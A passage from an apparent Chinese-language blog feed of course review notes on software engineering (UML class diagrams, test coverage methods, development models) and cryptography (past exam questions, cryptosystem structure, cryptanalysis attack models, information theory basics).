class="markdownIt-Anchor" href="#类图"></a> 类图</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401091520575.png" alt="image-20240109152034529" /></p><ul><li><p>关联</p><ul><li>普通关联：<strong>实线</strong></li><li>组合：部分不能脱离整体 1对1，<strong>实心的菱形+实线</strong> --&gt; 鸟，翅膀</li><li>聚合：整体和部分，部分可以脱离整体，<strong>空心的菱形+实线</strong> --&gt; 大雁群，大雁</li></ul></li><li><p>依赖</p><ul><li>A类中的某个方法中，使用了B类，就说A类依赖于B类，它们是依赖关系，<strong>虚线箭头</strong></li></ul></li><li><p>泛化</p><ul><li><p>继承</p><ul><li>子类继承父类，实现父类所有的功能，并拥有父类没有的功能，<strong>空心三角形+实线</strong></li></ul></li><li><p>实现</p><ul><li>实现表示一个class类实现interface接口(可以是多个)的功能。：<strong>空心三角形+虚线</strong>/棒棒糖(实线+空心圆)</li><li>图中的的是：大雁 -&gt; 飞行</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401091541536.png" alt="image-20240109154158506" /></li></ul></li></ul></li></ul><h2 id="第-9-章-测试"><a class="markdownIt-Anchor" href="#第-9-章-测试"></a> 第 9 章 测试</h2><h3 id="白盒测试"><a class="markdownIt-Anchor" href="#白盒测试"></a> 白盒测试</h3><h4 id="逻辑覆盖法"><a class="markdownIt-Anchor" href="#逻辑覆盖法"></a> 逻辑覆盖法</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401082318291.png" alt="image-20240108231839181" /></p><p>​这里的覆盖指每个测试满足覆盖条件</p><ol><li>语句覆盖：将程序中<strong>每个语句</strong>至少执行一次<ul><li>每个测试用例都要经过SACBED</li></ul></li><li>判定覆盖：<strong>每个判定</strong>的每个分支路径至少要执行一次<ul><li>对于两个判断A和B，找到测试用例，从而实现其T、F都经过(这里就是指所有的测试用例加起来)</li><li>例如：SACBED，SABD就满足条件</li></ul></li><li>条件覆盖：<strong>每个条件</strong>的真假两种情况至少执行一次<ul><li>对于A&gt;1 B=0 A=2 X&gt;1，找到测试用例，把每个的T，F都经过</li><li>例如：TTTT，FFFF就可以满足要求</li></ul></li><li>判定/条件覆盖<ul><li><strong>每个条件</strong>的真假两种情况至少执行一次</li><li><strong>每个判定</strong>的每个分支路径至少要执行一次</li><li>这里就是把判定覆盖和条件覆盖组合，找到测试用例可以覆盖所有这两个覆盖的情况</li></ul></li><li>条件组合覆盖：每个判定的所有条件的<strong>各种可能组合</strong>至少执行一次 -&gt; 最强白盒测试<ul><li>这个就是对于3的全组合了，3只要求至少实现一个就行，而这个是全组合，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>4</mn></msup></mrow><annotation encoding="application/x-tex">2^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span>可能，但是可能存在一个测试用例覆盖多个，所以比<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>4</mn></msup></mrow><annotation encoding="application/x-tex">2^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span>少</li></ul></li></ol><h4 id="路径测试法"><a class="markdownIt-Anchor" href="#路径测试法"></a> 路径测试法</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401082333108.png" alt="image-20240108233332059" /></p><ol><li>点覆盖：每个节点至少执行一次 = 语句覆盖</li><li>边覆盖：每条边至少执行一次 = 判定覆盖</li><li>路径覆盖：每条路径至少要执行一次 -&gt; <strong>最强白盒测试</strong><ul><li>这里即对于每个点之后存在两条边的情况，都要分两种测试用例</li></ul></li></ol><h3 id="黑盒测试"><a class="markdownIt-Anchor" href="#黑盒测试"></a> 黑盒测试</h3><h4 id="等价类"><a class="markdownIt-Anchor" href="#等价类"></a> 等价类</h4><table><thead><tr><th>输入条件</th><th>确立的等价类</th></tr></thead><tbody><tr><td>取值范围、取值的个数</td><td>一个有效等价类，两个无效等价类</td></tr><tr><td>输入值的集合</td><td>一个有效等价类，一个无效等价类</td></tr><tr><td>布尔值</td><td>一个有效等价类，一个无效等价类</td></tr><tr><td>数据的一组值</td><td>每一个输入值就是一个有效等价类(多个值多个等价类)，所有不允许的一个无效等价类</td></tr><tr><td>遵守的规则</td><td>一个有效等价类(遵守规则的)，不同角度违反规则的多个等价类</td></tr></tbody></table><ul><li>每个等价类都需要标上序号，然后在测试用例中覆盖等价类时写序号</li><li><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092113163.png" alt="image-20240109211353096" /></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401090947702.png" alt="image-20240109094742622" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092111803.png" alt="image-20240109211116760" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401092113523.png" alt="image-20240109211326461" /></p><p>这个测试用例后面还有</p><h2 id="简答"><a class="markdownIt-Anchor" href="#简答"></a> 简答</h2><p><strong>开发模型</strong></p><ul><li><p>边做边改模型</p><ul><li>开发过程<ul><li>与甲方不断沟通，不断打磨 -&gt; 没有形成文档化需要</li></ul></li><li>问题<ul><li>忽略需求环节</li><li>缺少规划和设计环节，软件的结构随着不断地修改越来越糟，导致无法继续修改</li></ul></li></ul></li><li><p>瀑布模型</p><ul><li><p>特点</p><ul><li><p>阶段间具有顺序性和依赖性</p><ol><li>顺序性: 必须等前一阶段的工作完成之后，才能开始后一阶段的工作</li><li>依赖性: 只有前一阶段的输出正确，后一阶段的工作才有可能获得正确的结果。</li></ol></li><li><p>推迟实现</p><ul><li>把逻辑设计与物理设计清楚的划分开来, 尽可能地推迟程序的物理实现</li></ul></li><li><p>质量保证</p><ol><li><p>各阶段都必须完成规定的文档</p></li><li><p>每一个阶段结束前都要对所完成的文档进行评审，以便尽早发现问题，改正错误</p></li></ol></li></ul></li><li><p>优点</p><ul><li>“线性”顺序结构</li></ul></li><li><p>缺点</p><ul><li>要求用户一开始清楚地给出所有需求，以后也不能发生任何的变化</li><li>由于开发模型是线性的，程序的运行版本一直要等到项目开发周期的晚期才能得到</li></ul></li></ul></li><li><p>原型模型</p><ul><li>步骤<ol><li>收集用户需求</li><li>建立原型 -&gt; 反映用户主要需求，集中于用户可见部分</li><li>用户评价原型 -&gt; 进一步精华软件</li><li>逐步调整原型</li></ol></li><li>优点<ul><li>原型为开发人员和用户提供了一种标识软件需求的机制</li><li>用户不必等到项目开发周期的晚期才能得到程序的可运行版本</li></ul></li></ul></li><li><p>增量模型</p><ul><li>软件被作为一系列的增量构件来设计、实现、集成和测试</li></ul></li><li><p>螺旋模型</p><ul><li>= 瀑布模型 + 原型模型</li><li>制定计划，风险分析，实施工程，客户评价</li></ul></li><li><p>演化模型</p><ul><li>不是很明确的软件项目，从需求清楚的部分开始，根据用户的建议逐渐向系统中添加功能</li><li>与边做边改相比，改变在于周期拉长，每次迭代采用瀑布模型等</li></ul></li><li><p>喷泉模型</p><ul><li>重复与迭代</li></ul></li><li><p>敏捷开发原则</p><ul><li><p>Scrum模型</p><ul><li>遵循敏捷开发原则的<strong>迭代</strong>式增量软件开发过程</li><li>工件<ol><li>产品 Backlog</li><li>Spring Backlog</li><li>产品增量</li></ol></li><li>角色<ol><li>Product Owner -&gt; 负责产品待办事项表</li><li>Scrum Master -&gt; 定时组织会议，不要管理团队</li><li>团队</li></ol></li></ul></li><li><p>看板</p><ul><li>后道工序在需要时，通过看板向前道工序发出信号–请给我需要数量的输入，前道工序只有得到看板后，才按需生产。-&gt; 信号由下游向上游传递，拉动上游的生产活动，使产品向下游流动</li></ul></li><li><p>极限编程</p></li></ul></li><li><p>统一软件工程(RUP)</p></li><li><p>devops开发维护模型</p><ul><li>多主体，可以随时更新(代码托管？)-&gt;模糊开发与运维的界限</li><li>引入自动化工具呈现持续集成，持续部署等实践</li><li>Scrum模型，看板，极限编程</li></ul></li></ul><p><strong>编程语言选择</strong></p><ol><li>系统用户的要求</li><li>选择适合应用领域的语言</li><li>可以使用的编程程序<ul><li>编程程序是否可以运行在目标系统的环境中</li></ul></li><li>可以得到的软件工具<ul><li>是否有支持某种语言程序开发的软件工具可以利用</li></ul></li><li>软件可移植性要求<ul><li>如果目标系统将在不同类型的设备上运行，或者预期的使用寿命很长，那么选择一种标准化程序高、程序可移植性好的语言就是很重要的</li></ul></li><li>人的因素<ul><li>尽量选用程序员和系统维护人员熟悉的语言环境，以节省开发时间，也有利于将来使用和维护工作</li></ul></li><li>工程规模</li></ol>]]></content>
    
    
    <categories>
      
      <category>课程复习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学</title>
    <link href="/posts/abb54922.html"/>
    <url>/posts/abb54922.html</url>
    
    <content type="html"><![CDATA[<h1 id="复习资料"><a class="markdownIt-Anchor" href="#复习资料"></a> 复习资料</h1><h2 id="历年考题"><a class="markdownIt-Anchor" href="#历年考题"></a> 历年考题</h2><h3 id="2021-b"><a class="markdownIt-Anchor" href="#2021-b"></a> 2021-B</h3><p><strong>简答题(30)</strong></p><ol><li>根据密钥，密码体制的分类分为哪两类？</li><li>分组密码的2个设计准则是？分组密码中的轮函数F由哪三部分组成？</li><li>密码协议的秘密共享里的唯一一道例题</li><li>明文、密文、加密函数的概念</li><li>Hash函数数据填充</li><li>RSA算法，Alice传消息给Bob用哪个钥匙？设计一个用Alice私钥签名的流程？</li></ol><p><strong>计算(30)</strong></p><ol><li>仿射密码，已知明文攻击，给出完整密文、第一个字母+最后一个字母的明文，推出所有明文。</li><li>画出Feistel一轮循环的图示，S盒代换(给出了S盒和输入序列)</li><li>A/B差异(maybe)<ul><li>RSA计算，模重复平方法，实现加密。</li><li>是不是任意公钥算法都可以用来签名？什么样的公钥算法可以用于签名？</li></ul></li></ol><p><strong>论述/分析(20)</strong></p><ol><li>给出了具体的Shamir数字签名方案和p、q、e、i数据，求解私钥</li><li>A/B差异(maybe)<ul><li>证明算法正确性(给出了要证明的公式)。</li><li>线性移位反馈寄存器的反馈函数+周期+输出序列+游程(给出了一组数，分析长度为1的游程有几个)</li></ul></li></ol><p><strong>综合题(20)</strong></p><ol><li><strong>(2分)</strong> AES迭代轮数与密钥长度、分组长度的关系(给出密钥长度、分组长度，写出AES迭代轮数)</li><li><strong>(10分)</strong> 分组密码里的多项式乘法(题目为：57*13)</li><li><strong>(8分)</strong> 设计一种密码工作模式：并行、速度快(计数器模式)<ol><li>画出图示或写出加解密公式</li><li>如果明文分组内容相同，密文分组中的密文是否一样？</li></ol></li></ol><h3 id="2022-a"><a class="markdownIt-Anchor" href="#2022-a"></a> 2022-A</h3><p>基本不考察理论背诵和算法记忆(除了AES、DES、SM4)</p><p><strong>第一大题(30分)</strong></p><ol><li>画出Feistel一轮的流程图</li><li>给定消息bit数问hash(MD5)的填充方式</li><li>给定6位密码包括0-9和a-z分析秘钥空间</li><li>给定一串字符计算游程的个数(要首尾连接)</li><li>aes的子密钥多少bit，简述生成过程</li><li>给6bit值计算des的sbox替换</li></ol><p><strong>第二大题(30分)</strong></p><ol><li>给定仿射加密式求解密，本次解密结果为CUMT</li><li>AES列混淆中GF(2^8)域上的乘法，多项式运算，本年计算0x2*0xc1</li><li>RSA给定p、q、e小数据，要求解密密文</li></ol><p><strong>第三大题(20)</strong></p><ol><li>证明DES有代数互补性、画出CBC的解密图</li><li>LFSR给定一个特征多项式，要求画出LFSR的图和给出f函数，第二问是给定初始状态求输出序列和周期(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^5+x^4+x^2+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>)</li></ol><p><strong>第四大题(20)</strong></p><p>一大题，三小问，本年度考察EIGAMAL算法，公钥只要求记忆RSA的算法，所以EIGAMAL和ECC的算法都会给出。</p><ol><li>EIGAMAL的公钥和私钥(5)</li><li>证明算法的正确性(5)</li><li>给定参数实现加密和解密(10)</li></ol><h2 id="复习要求"><a class="markdownIt-Anchor" href="#复习要求"></a> 复习要求</h2><p><strong>第2章 密码学基础</strong></p><ol><li>主要是香农理论，需要知道熵的概念，叙述与计算公式，给出具体数据计算</li></ol><p><strong>第3章 古典密码体制</strong></p><ol><li>基本置换、替换密码基本概念</li><li>对经典密码算法分析密钥空间</li><li>给定明、密文进行求解</li></ol><p><strong>第4章 分组密码</strong></p><ol><li>DES与AES算法的原理与流程，加解密过程</li><li>DES，AES安全性分析</li><li>难点在于AES的计算 --&gt; 字节上的运算</li><li>五种工作模式，画出加解密工作图</li><li>用代数系统分析优缺点及错误传播情况</li></ol><p><strong>第5章 序列密码</strong></p><ol><li>线性位移寄存器，给定初始状态，特征多项式，反馈函数(注意区分)，需要写出工作图，框架图，写出输出状态与周期，理解什么是m序列</li></ol><p><strong>第6章 Hash函数</strong></p><ol><li>不会去描述具体的算法</li><li>需要知道大概的框架，对于数据填充有了解</li><li>知道hash本身的概念，设计原则</li><li>关于hash函数的碰撞性和典型的攻击方式</li></ol><p><strong>第 7/8章 公钥密码体制与数字签名</strong></p><ol><li>只考RSA与ELGamal</li><li>RSA的概念及算法，安全分析，给出具体实例可以计算</li><li>ELGamal也一样，不要求具体流程，但需要安全性基础，数学基础(书上的例题)，加密解密数字签名的逻辑进行分析，对安全性进行分析</li></ol><h1 id="第2章-密码学基础"><a class="markdownIt-Anchor" href="#第2章-密码学基础"></a> 第2章 密码学基础</h1><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401022134058.png" alt="image-20240102213458956" /></p><h2 id="密码体制"><a class="markdownIt-Anchor" href="#密码体制"></a> 密码体制</h2><h3 id="组成部分"><a class="markdownIt-Anchor" href="#组成部分"></a> 组成部分</h3><blockquote><p>五元组(M、C、K、E、D)</p></blockquote><ol><li>明文空间<code>M</code> --&gt; 全体明文的集合</li><li>密文空间<code>C</code> --&gt; 全体密文的集合</li><li>密钥空间<code>K</code> --&gt; 全体密钥的集合。其中每一个密钥K均由加密密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>e</mi></msub></mrow><annotation encoding="application/x-tex">K_{e}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和解密密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">K_{d}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>组成，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mo>&lt;</mo><msub><mi>K</mi><mi>e</mi></msub><mo separator="true">,</mo><msub><mi>K</mi><mi>d</mi></msub><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">K = &lt;K_{e},K_{d}&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span></li><li>加密算法<code>E</code> --&gt; 一组由M到C的加密变换</li><li>解密算法<code>D</code> --&gt; 一组由C到M的解密变换</li></ol><h3 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h3><h4 id="对称密码"><a class="markdownIt-Anchor" href="#对称密码"></a> 对称密码</h4><ul><li>序列密码(stream cipher)<ul><li>RC4，A5等</li></ul></li><li>分组密码(block cipher)<ul><li>DES，3DES，AES，IDEA等</li></ul></li></ul><h4 id="公钥密码体制非对称密码体制"><a class="markdownIt-Anchor" href="#公钥密码体制非对称密码体制"></a> 公钥密码体制/非对称密码体制</h4><ul><li>典型公钥密码体制<ul><li>RSA，Elgamal，ECC</li></ul></li></ul><h2 id="密码分析"><a class="markdownIt-Anchor" href="#密码分析"></a> 密码分析</h2><h3 id="攻击密码系统的方法"><a class="markdownIt-Anchor" href="#攻击密码系统的方法"></a> 攻击密码系统的方法</h3><ul><li>穷举攻击：攻击者<strong>试遍</strong>所有可能的<strong>密钥</strong>对所获密文进行解密，直至得到正确的明文<ul><li>变体：字典攻击</li></ul></li><li>统计攻击：根据明文、密文和密钥的<strong>统计规律</strong>来破译密码的方法<ul><li>多适用于对称密码体制</li></ul></li><li>数学分析攻击：针对加解密算法的<strong>数学基础</strong>和<strong>某些密码学特</strong>性，通过<strong>数学求解</strong>的方法来破译密码<ul><li>多适用于公钥密码体制</li></ul></li></ul><h3 id="密码分析攻击"><a class="markdownIt-Anchor" href="#密码分析攻击"></a> 密码分析攻击</h3><blockquote><p>前提：攻击者知道密码算法</p></blockquote><h4 id="唯密文攻击"><a class="markdownIt-Anchor" href="#唯密文攻击"></a> 唯密文攻击</h4><ul><li>被动攻击，密码分析者仅能根据<strong>截获的密文</strong>进行分析，以得出明文或密钥</li><li>穷举攻击和统计分析都是唯密文攻击</li></ul><h4 id="已知明文攻击"><a class="markdownIt-Anchor" href="#已知明文攻击"></a> 已知明文攻击</h4><ul><li>被动攻击，密码分析者除了有<strong>截获的密文</strong>外，还有一些已知的 “<strong>明文—密文对</strong>” 来破译密码</li><li>现代的密码体制(基本要求)不仅要经受得住唯密文攻击，而且要经受得住已知明文攻击</li></ul><h4 id="选择明文攻击"><a class="markdownIt-Anchor" href="#选择明文攻击"></a> 选择明文攻击</h4><ul><li>主动攻击：密码分析者除得到一些 “<strong>明文—密文对</strong>” 外，还可以<strong>选择被加密的明文，并获得相应的密文</strong>；<code>密码破译者暂时控制加密机</code></li><li>变体：自适应选择明文攻击</li></ul><h4 id="选择密文攻击"><a class="markdownIt-Anchor" href="#选择密文攻击"></a> 选择密文攻击</h4><ul><li>主动攻击，密码分析者可以<strong>选择一些密文，并得到相应的明文</strong>；<code>密码破译者暂时控制解密机</code> --&gt; 它与选择明文攻击相反</li><li>密码分析者的任务目标是推出密钥</li><li>多用于攻击公钥密码体制，可以用于 ElGamal 的小步大步法破解，即伪造真实密文与自己的密文的联合体，对其进行解密，然后用得到的信息可以再解密出真实的密文<ul><li>可以理解为真实密文保密等级高，不能解密；自己伪造后保密等级降低，可以解密，从而可以根据低等级解密信息来对真实密文进行解密</li></ul></li><li>变体：自适应选择密文攻击</li></ul><h4 id="选择文本攻击"><a class="markdownIt-Anchor" href="#选择文本攻击"></a> 选择文本攻击</h4><ul><li>主动攻击，选择明文攻击+选择密文攻击</li></ul><h2 id="信息论基础"><a class="markdownIt-Anchor" href="#信息论基础"></a> 信息论基础</h2><ul><li><p><strong>单符号离散信源</strong>：如果信源发出的消息是离散的、有限或无限可列的符号或数字，且一个符号代表一条完整的消息，则称单符号离散信源</p></li><li><p>**信源空间：**若信源的输出是随机事件x，其出现概率为p(x)，则它们构成的集合，称为信源的概率空间或简称为信源空间</p></li><li><p>**自信息量：**一个随机事件的自信息量为其出现概率对数的负值。–&gt; 事件x发生可得到的信息量，即</p></li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>l</mi><mi>o</mi><mi>g</mi><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">l(x_i)=-\log p(x_i)=log\frac1{p(x_i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.25744em;vertical-align:-0.936em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord">1</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li><p>随机事件的信息量和不确定度有很密切的联系</p><ul><li>如果发生一个不确定度小的事件，则带来的信息量较小</li><li>如果发生一个不确定度高的事件，它带来的信息量很大</li><li>如果是必然事件，则没有信息量</li></ul></li><li><p>**联合自信息量：**若两个消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">x_{i},y_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 